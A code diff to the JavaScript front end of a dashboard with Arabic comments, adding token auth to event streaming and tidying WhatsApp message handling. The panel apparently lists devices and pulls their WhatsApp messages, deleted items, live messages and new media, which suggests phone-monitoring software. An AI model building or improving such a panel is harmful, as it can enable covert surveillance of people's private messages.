@@ -84,12 +84,15 @@ function showNotification(title, message, icon) {
     setTimeout(() => { if (div.parentElement) div.remove(); }, 8000);
 }
 
+// ✅ محدّث: SSE مع token auth
 function initSSE() {
     if (sse) { try { sse.close(); } catch(e){} sse = null; }
     if (!currentDevice) return;
 
     try {
-        sse = new EventSource(`/events.php?device=${encodeURIComponent(currentDevice)}`);
+        sse = new EventSource(
+            `/events.php?device=${encodeURIComponent(currentDevice)}&token=${encodeURIComponent(getAuthToken())}`
+        );
 
         sse.addEventListener('new_media', (e) => {
             try {
@@ -203,9 +206,11 @@ function initSSE() {
             } catch (err) {}
         });
 
+        // ✅ محدّث: onerror مع فحص token
         sse.onerror = () => {
             try { sse.close(); } catch(e){}
             sse = null;
+            if (!getAuthToken()) { window.location.href = 'login.html'; return; }
             setTimeout(initSSE, 3000);
         };
 
@@ -949,13 +954,11 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ محدّث: عرض آخر 20 رسالة فقط
 async function loadWhatsApp() {
     try {
         const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
         let messages = await response.json();
 
-        // ✅ عرض آخر 20 رسالة فقط
         if (Array.isArray(messages)) {
             messages = messages.slice(-20);
         }
@@ -1064,7 +1067,13 @@ async function deleteSelectedWhatsApp() {
     try {
         const response = await authFetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
         const result = await response.json();
-        if (result.success) { closeWhatsAppChat(); loadWhatsApp(); }
+        if (result.success) {
+            const sender = currentChat;
+            closeWhatsAppChat();
+            loadWhatsApp();
+            // ✅ إعادة فتح الشات إذا كان مفتوح
+            if (sender) setTimeout(() => openWhatsAppChat(sender), 500);
+        }
     } catch (e) {}
 }
 async function deleteWhatsAppChat(sender) {
@@ -1076,7 +1085,6 @@ async function deleteWhatsAppChat(sender) {
     } catch (e) {}
 }
 
-// ✅ جديد: مسح كل رسائل واتساب من السيرفر
 async function clearWhatsAppList() {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
     if (!confirm('⚠️ مسح كل رسائل واتساب من السيرفر؟')) return;
@@ -1084,22 +1092,19 @@ async function clearWhatsAppList() {
         const response = await authFetch(`/api.php?action=clear_whatsapp&device=${encodeURIComponent(currentDevice)}`);
         const data = await response.json();
         if (data.success) {
-            // نظّف الواجهة
             const div = document.getElementById('whatsappList');
             if (div) div.innerHTML = '<p style="color:#888;">تم المسح</p>';
-            
-            // صفّر العدادات
+
             const badge = document.getElementById('whatsappCount');
             if (badge) badge.textContent = '(0)';
-            
-            // صفّر الرسائل الفورية أيضاً
+
             liveMsgs = [];
             const liveBadge = document.getElementById('liveMsgsCount');
             if (liveBadge) liveBadge.textContent = '0';
-            
+
             showNotification('✅', 'تم مسح رسائل واتساب', '🗑️');
         } else {
-            alert('❌ فشل المسح - تأكد من رفع app.js على Render');
+            alert('❌ فشل المسح');
         }
     } catch (e) {
         alert('❌ خطأ: ' + e.message);
@@ -1672,7 +1677,14 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     }
 })();
 
-setInterval(() => { loadAuthorizedDevices(); }, 15000);
+// ✅ يستدعي فقط لو في تبويب الأمان نشط
+setInterval(() => {
+    const secTab = document.getElementById('securityTab');
+    if (secTab && secTab.classList.contains('active')) {
+        loadAuthorizedDevices();
+    }
+}, 15000);
+
 loadAuthorizedDevices();
 
 loadDevices();
